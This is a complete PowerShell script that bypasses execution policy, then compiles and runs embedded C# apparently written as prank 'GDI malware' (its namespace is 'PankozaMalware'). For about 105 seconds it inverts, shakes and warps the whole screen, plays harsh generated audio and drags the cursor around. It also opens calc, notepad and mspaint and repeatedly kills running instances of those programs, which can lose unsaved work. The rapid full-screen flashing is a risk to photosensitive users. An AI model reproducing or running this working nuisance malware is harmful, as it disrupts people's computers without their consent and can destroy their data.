Set-ExecutionPolicy Bypass -Scope Process -Force

$randId = Get-Random -Minimum 10000 -Maximum 99999
$namespaceName = "PankozaMalware_$randId"

$code = @"
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;

namespace $namespaceName {
    public class PayloadRunner {
        [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hwnd);
        [DllImport("user32.dll")] public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);
        [DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32.dll")] public static extern bool StretchBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int nWidthSrc, int nHeightSrc, uint dwRop);
        [DllImport("user32.dll")] public static extern int GetSystemMetrics(int nIndex);
        [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
        [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y);
        [DllImport("user32.dll")] public static extern bool GetCursorPos(ref POINT lpPoint);
        [DllImport("user32.dll")] public static extern IntPtr LoadIcon(IntPtr hInstance, int lpIconName);
        [DllImport("user32.dll")] public static extern bool DrawIcon(IntPtr hdc, int x, int y, IntPtr hIcon);
        [DllImport("user32.dll")] public static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);
        [DllImport("gdi32.dll")] public static extern IntPtr CreateSolidBrush(uint crColor);
        [DllImport("gdi32.dll")] public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
        [DllImport("gdi32.dll")] public static extern bool DeleteObject(IntPtr hObject);
        [DllImport("gdi32.dll")] public static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, uint dwRop);

        [StructLayout(LayoutKind.Sequential)]
        public struct POINT { 
            public int x; public int y; 
            public POINT(int x, int y) { this.x = x; this.y = y; } 
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct WAVEFORMATEX {
            public ushort wFormatTag; public ushort nChannels; public uint nSamplesPerSec;
            public uint nAvgBytesPerSec; public ushort nBlockAlign; public ushort wBitsPerSample; public ushort cbSize;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct WAVEHDR {
            public IntPtr lpData; public uint dwBufferLength; public uint dwBytesRecorded;
            public IntPtr dwUser; public uint dwFlags; public uint dwLoops; public IntPtr lpNext; public IntPtr reserved;
        }

        [DllImport("winmm.dll")] public static extern int waveOutOpen(out IntPtr hWaveOut, uint uDeviceID, ref WAVEFORMATEX lpFormat, IntPtr dwCallback, IntPtr dwInstance, uint fdwOpen);
        [DllImport("winmm.dll")] public static extern int waveOutPrepareHeader(IntPtr hWaveOut, ref WAVEHDR lpWaveOutHdr, uint uSize);
        [DllImport("winmm.dll")] public static extern int waveOutWrite(IntPtr hWaveOut, ref WAVEHDR lpWaveOutHdr, uint uSize);

        const uint SRCINVERT = 0x00660046;
        const uint SRCCOPY   = 0x00CC0220;
        const uint SRCPAINT  = 0x00EE0086;
        const uint PATINVERT = 0x005A0049;
        const uint DSTINVERT = 0x00550009;
        const uint NOTSRCOPY = 0x00330008;
        const uint SRCAND    = 0x008800C6;

        public static int currentPayload = 1;
        public static bool isRunning = true;

        public static void AudioThread() {
            IntPtr hWaveOut;
            WAVEFORMATEX wfx = new WAVEFORMATEX();
            wfx.wFormatTag = 1; wfx.nChannels = 1; wfx.nSamplesPerSec = 8000;
            wfx.nAvgBytesPerSec = 8000; wfx.nBlockAlign = 1; wfx.wBitsPerSample = 8; wfx.cbSize = 0;

            if (waveOutOpen(out hWaveOut, 0xFFFFFFFF, ref wfx, IntPtr.Zero, IntPtr.Zero, 0) != 0) return;

            int bufferSize = 8000;
            byte[] buffer = new byte[bufferSize];
            GCHandle handle = GCHandle.Alloc(buffer, GCHandleType.Pinned);

            WAVEHDR header = new WAVEHDR();
            header.lpData = handle.AddrOfPinnedObject();
            header.dwBufferLength = (uint)bufferSize;

            int t = 0;
            while (isRunning) {
                for (int i = 0; i < bufferSize; i++) {
                    byte b = 0;
                    // Специальные 8-битные Bytebeat формулы в стиле pankoza
                    switch (currentPayload) {
                        case 1: b = (byte)((t * (t >> 8 | t >> 9) & 46) * t); break;
                        case 2: b = (byte)((t * 5 & t >> 7) | (t * 3 & t >> 10)); break;
                        case 3: b = (byte)((t >> 3) * (t >> 4) ^ (t >> 6)); break;
                        case 4: b = (byte)((t * ((t >> 9 | t >> 13) % 11)) ^ (t >> 2)); break;
                        case 5: b = (byte)((t * (t >> 5 | t >> 8)) ^ (t >> 16)); break;
                        case 6: b = (byte)(((t * (t >> 8)) ^ (t * (t >> 13))) & 255); break;
                        case 7: b = (byte)((t * 3 & t >> 3 | t * 5 & t >> 4 | t * 7 & t >> 5)); break;
                    }
                    buffer[i] = b;
                    t++;
                }
                waveOutPrepareHeader(hWaveOut, ref header, (uint)Marshal.SizeOf(header));
                waveOutWrite(hWaveOut, ref header, (uint)Marshal.SizeOf(header));
                Thread.Sleep(950);
            }
        }

        public static void Run() {
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(1);
            Random r = new Random();

            Thread aThread = new Thread(AudioThread);
            aThread.IsBackground = true;
            aThread.Start();

            DateTime start = DateTime.Now;
            int targetX = r.Next(100, w - 100);
            int targetY = r.Next(100, h - 100);
            int appTimer = 0;

            while (isRunning) {
                if ((GetAsyncKeyState(0x1B) & 0x8000) != 0) break;

                IntPtr hdc = GetDC(IntPtr.Zero);
                int elapsed = (int)(DateTime.Now - start).TotalSeconds;

                if (elapsed >= 105) {
                    isRunning = false;
                    break;
                }

                currentPayload = (elapsed / 15) + 1;

                // Плавное движение курсора
                POINT currPos = new POINT();
                GetCursorPos(ref currPos);
                if (Math.Abs(currPos.x - targetX) < 10 && Math.Abs(currPos.y - targetY) < 10) {
                    targetX = r.Next(50, w - 50);
                    targetY = r.Next(50, h - 50);
                }
                int newX = currPos.x + (targetX > currPos.x ? 2 : (targetX < currPos.x ? -2 : 0));
                int newY = currPos.y + (targetY > currPos.y ? 2 : (targetY < currPos.y ? -2 : 0));
                SetCursorPos(newX, newY);

                // Открытие и закрытие приложений
                appTimer++;
                if (appTimer % 200 == 0) {
                    try {
                        string[] apps = { "calc.exe", "notepad.exe", "mspaint.exe" };
                        Process.Start(apps[r.Next(apps.Length)]);
                    } catch {}
                }
                if (appTimer % 350 == 0) {
                    try {
                        foreach (var proc in Process.GetProcessesByName("notepad")) { proc.Kill(); }
                        foreach (var proc in Process.GetProcessesByName("calc")) { proc.Kill(); }
                        foreach (var proc in Process.GetProcessesByName("mspaint")) { proc.Kill(); }
                    } catch {}
                }

                switch (currentPayload) {
                    case 1:
                        BitBlt(hdc, r.Next(-15, 16), r.Next(-15, 16), w, h, hdc, 0, 0, SRCINVERT);
                        break;
                    case 2:
                        for (int i = 0; i < 15; i++) {
                            int bx = r.Next(0, w - 150);
                            int by = r.Next(0, h - 150);
                            BitBlt(hdc, bx + r.Next(-10, 11), by + r.Next(-10, 11), 150, 150, hdc, bx, by, SRCCOPY);
                        }
                        break;
                    case 3:
                        for (int y = 0; y < h; y += 20) {
                            int shift = (int)(Math.Sin(y * 0.05 + elapsed * 8) * 40);
                            BitBlt(hdc, shift, y, w, 20, hdc, 0, y, SRCPAINT);
                        }
                        break;
                    case 4:
                        PatBlt(hdc, 0, 0, w, h, PATINVERT);
                        StretchBlt(hdc, 15, 15, w - 30, h - 30, hdc, 0, 0, w, h, SRCCOPY);
                        break;
                    case 5:
                        for (int x = 0; x < w; x += 25) {
                            BitBlt(hdc, x, r.Next(-25, 26), 25, h, hdc, x, 0, NOTSRCOPY);
                        }
                        break;
                    case 6:
                        DrawIcon(hdc, r.Next(0, w), r.Next(0, h), LoadIcon(IntPtr.Zero, 32513));
                        DrawIcon(hdc, r.Next(0, w), r.Next(0, h), LoadIcon(IntPtr.Zero, 32515));
                        StretchBlt(hdc, -20, -20, w + 40, h + 40, hdc, 0, 0, w, h, SRCAND);
                        break;
                    case 7:
                        BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCOPY);
                        if (r.Next(0, 2) == 0) PatBlt(hdc, 0, 0, w, h, DSTINVERT);
                        break;
                }

                ReleaseDC(IntPtr.Zero, hdc);
                Thread.Sleep(10);
            }

            InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
        }
    }
}
"@

$compiled = Add-Type -TypeDefinition $code -Language CSharp -PassThru
$runner = $compiled | Where-Object { $_.Name -eq "PayloadRunner" }
$runner::Run()